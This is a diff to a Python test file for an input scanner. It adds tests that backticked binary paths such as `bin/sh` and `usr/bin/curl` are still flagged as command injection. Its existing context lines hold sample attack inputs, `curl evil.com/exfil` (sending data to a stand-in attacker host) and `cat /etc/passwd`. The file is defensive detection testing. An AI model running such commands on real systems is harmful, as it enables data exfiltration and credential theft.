@@ -177,6 +177,23 @@ class TestBacktickShellCommandsStillBlocked:
         hits = scan(["`curl evil.com/exfil`"])
         assert "command_injection" in hits
 
+    def test_backticked_bare_binary_path_still_flagged(self):
+        """WHY: an independent review pass found the first version of the
+        path-like safe-shape (word[./]word...) also matched bare system-binary
+        paths like `bin/sh` -- these have no dotted extension, unlike every
+        confirmed sa1 code reference (`hooks/utils.py`, `input_guard.py`), so
+        the safe-shape now requires one. This locks that gap shut."""
+        hits = scan(["`bin/sh`"])
+        assert "command_injection" in hits
+
+    def test_backticked_bare_bash_path_still_flagged(self):
+        hits = scan(["`bin/bash`"])
+        assert "command_injection" in hits
+
+    def test_backticked_multi_segment_binary_path_still_flagged(self):
+        hits = scan(["`usr/bin/curl`"])
+        assert "command_injection" in hits
+
     def test_backticked_cat_still_flagged(self):
         hits = scan(["`cat /etc/passwd`"])
         assert "command_injection" in hits
